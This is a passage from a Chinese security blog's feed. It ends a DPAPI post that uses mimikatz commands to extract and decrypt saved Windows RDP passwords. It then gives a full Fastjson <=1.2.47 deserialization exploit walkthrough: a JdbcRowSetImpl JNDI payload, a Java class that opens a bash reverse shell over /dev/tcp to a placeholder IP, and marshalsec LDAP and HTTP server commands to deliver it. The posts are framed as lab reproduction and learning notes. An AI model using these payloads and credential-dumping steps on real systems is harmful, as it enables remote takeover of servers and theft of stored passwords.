(CALG_AES_256)</span><br><span class="line">    pbKey            : 07f73eaad338c8f205525bcd76883a9280e646b79fd93fef9b162aaeea97241a03dc6aa5b9f64734d20ad78b6f6d9d4c8aa79a8d03155116c61e5e514e5ed570847f81a2ca904085672de962c687614e72dc9cd62a5c5f2ac89e1643bf3b9612218a4bbe8bfe22304389f6fa155a9790</span><br><span class="line"></span><br><span class="line">[credhist]</span><br><span class="line">  **CREDHIST INFO**</span><br><span class="line">    dwVersion        : 00000003 - 3</span><br><span class="line">    guid             : &#123;bc99ef8c-8b47-4d3c-a316-2daba229d091&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auto SID from path seems to be: S-1-5-21-3716468413-4174316740-3893867168-1001</span><br></pre></td></tr></table></figure></p><h1 id="破解rdp密码"><a href="#破解rdp密码" class="headerlink" title="破解rdp密码"></a>破解rdp密码</h1><p>首先查看保存的rdp凭据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /line</span><br></pre></td></tr></table></figure></p><p><img src="/2020/06/24/DPAPI学习记录/cmdkey.png" alt></p><p>windows保存rdp凭据的位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\用户名\AppData\Local\Microsoft\Credentials</span><br></pre></td></tr></table></figure></p><p>我们可以查看该目录下的文件有啥：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\swag7&gt;dir /a C:\Users\swag7\AppData\Local\Microsoft\Credentials\*</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 EA04-9FD7</span><br><span class="line"></span><br><span class="line"> C:\Users\swag7\AppData\Local\Microsoft\Credentials 的目录</span><br><span class="line"></span><br><span class="line">2020/06/29  11:04    &lt;DIR&gt;          .</span><br><span class="line">2020/06/29  11:04    &lt;DIR&gt;          ..</span><br><span class="line">2020/06/29  11:04               434 0584A81C75E5FE36C40B464C8CFBCD0F</span><br><span class="line">               1 个文件            434 字节</span><br><span class="line">               2 个目录 38,597,902,336 可用字节</span><br></pre></td></tr></table></figure></p><p>用管理员权限打开mimikatz，先提个权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure></p><p>解析rdp凭证文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\swag7&gt;dir /a C:\Users\swag7\AppData\Local\Microsoft\Credentials\0584A81C75E5FE36C40B464C8CFBCD0F</span><br></pre></td></tr></table></figure></p><p><img src="/2020/06/24/DPAPI学习记录/cred.png" alt></p><p>获取到guidMasterKey，这里的gmk其实就是我们的master key file名称，位置就在<strong>%APPDATA%/Microsoft/Protect/%SID%</strong>下</p><p>其实这里可以直接用mimikatz读取所有masterkeyfile对应的masterkey，使用命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::dpapi</span><br></pre></td></tr></table></figure></p><p><img src="/2020/06/24/DPAPI学习记录/sekurlsa.png" alt><br>这里其实mimikatz已经将masterkey放入缓存中，下次我们读取cred文件的时候mimikatz会直接利用masterkey进行解密。</p><p>我们再运行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\swag7&gt;dir /a C:\Users\swag7\AppData\Local\Microsoft\Credentials\0584A81C75E5FE36C40B464C8CFBCD0F</span><br></pre></td></tr></table></figure></p><p>结果如下，成功读取远程密码：<br><img src="/2020/06/24/DPAPI学习记录/08067.png" alt></p><p>查看dpapi缓存：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cache</span><br></pre></td></tr></table></figure></p><p><img src="/2020/06/24/DPAPI学习记录/cache.png" alt></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8Masterkey%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8Masterkey%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/</a></p><p><a href="https://xz.aliyun.com/t/6508" title="通过Dpapi获取Windows身份凭证" target="_blank" rel="noopener">https://xz.aliyun.com/t/6508</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU0MjUxNjgyOQ==&amp;mid=2247484902&amp;idx=1&amp;sn=34368d206718cb54c25b313269e2aad1&amp;chksm=fb1836d4cc6fbfc2b7a7e58f56165bee8d32acf1b4401db97871ecca6b9d553defc9a2aa8d90&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1592704653330&amp;sharer_shareid=77d7080072e01bc1b7467c4c6be5286c&amp;key=a400e754e637d7415ea75085024d4d38cf9dbbc9afdc43acf760292d0b8f00b2cf04e6c13a4c4026323f5be1b4ef454b37f2f7306c95be2be60c4b53e04c88e881748c5c6edef709b9fa51235514ab79&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10+x64&amp;version=62090070&amp;lang=zh_CN&amp;exportkey=A2tUlfv5mKxyCotw15u%2BvFM%3D&amp;pass_ticket=ckOSR7XKlwU3rEqxX2SpxqCdFprRDHd9WP%2FItnFo%2F%2FQWwsYS36JtDqzeqMJxpCHX" title="获取已控机器本地保存的RDP密码" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU0MjUxNjgyOQ==&amp;mid=2247484902&amp;idx=1&amp;sn=34368d206718cb54c25b313269e2aad1&amp;chksm=fb1836d4cc6fbfc2b7a7e58f56165bee8d32acf1b4401db97871ecca6b9d553defc9a2aa8d90&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1592704653330&amp;sharer_shareid=77d7080072e01bc1b7467c4c6be5286c&amp;key=a400e754e637d7415ea75085024d4d38cf9dbbc9afdc43acf760292d0b8f00b2cf04e6c13a4c4026323f5be1b4ef454b37f2f7306c95be2be60c4b53e04c88e881748c5c6edef709b9fa51235514ab79&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10+x64&amp;version=62090070&amp;lang=zh_CN&amp;exportkey=A2tUlfv5mKxyCotw15u%2BvFM%3D&amp;pass_ticket=ckOSR7XKlwU3rEqxX2SpxqCdFprRDHd9WP%2FItnFo%2F%2FQWwsYS36JtDqzeqMJxpCHX</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;什么是DPAPI&quot;&gt;&lt;a href=&quot;#什么是DPAPI&quot; class=&quot;headerlink&quot; title=&quot;什么是DPAPI&quot;&gt;&lt;/a&gt;什么是DPAPI&lt;/h1&gt;&lt;p&gt;DPAPI(Data Protection Application Programming 
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson&lt;=1.2.47 反序列化漏洞</title>
    <link href="http://sherlocz.github.io/2020/06/22/Fastjson-1-2-47-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://sherlocz.github.io/2020/06/22/Fastjson-1-2-47-反序列化漏洞/</id>
    <published>2020-06-22T10:01:18.000Z</published>
    <updated>2020-06-22T10:25:28.251Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li>fastjson-1.2.47</li><li>jdk-8u181-linux-x64.tar.gz</li><li>marshalsec-0.0.3-SNAPSHOT-all.jar</li><li>tomcat8.35</li></ul><p>可以用P神的vulhub和docker搭建，这里我尝试搭建了好久报错，就还是自己手工搭建吧。</p><p><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/dajian.png" alt><br><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/test.png" alt></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先我们可以利用DNSLOG进行漏洞探测：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://q0qdv.l.dnslog.io/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/dnslog.png" alt></p><p>但是好像只能打一次，过一会就不能打了。</p><p>接下来我们反弹shell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class Exploit&#123;</span><br><span class="line">    public Exploit() throws Exception &#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/xxx.xxx.xxx.xxx/12345;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        while((line = reader.readLine()) != null) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>将以上代码保存为Exploit.java，然后javac编译成class，编译好之后上传服务器，在该目录下启用python http服务：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 7000</span><br></pre></td></tr></table></figure></p><p><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/7000.png" alt></p><p>开启nc监听，上面的代码中监听的12345：<br><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/nc.png" alt></p><p>使用marshalsec工具快捷的开启LDAP服务：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://xxx.xxx.xxx.xxx:7000/#Exploit 7500</span><br></pre></td></tr></table></figure></p><p><img src="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/marshalsec.png" alt></p><p>一共开启了三个监听，最后我们发送payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://xxxxxx:7000/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>shell就可以弹回来了，但是一个ip只可以利用一次。</p><p>还需要注意jdk的版本。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;fastjson-1.2.47&lt;/li&gt;
&lt;li&gt;jdk-8u181-linux-x64.tar.gz&lt;/li&gt;
      
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
</feed>
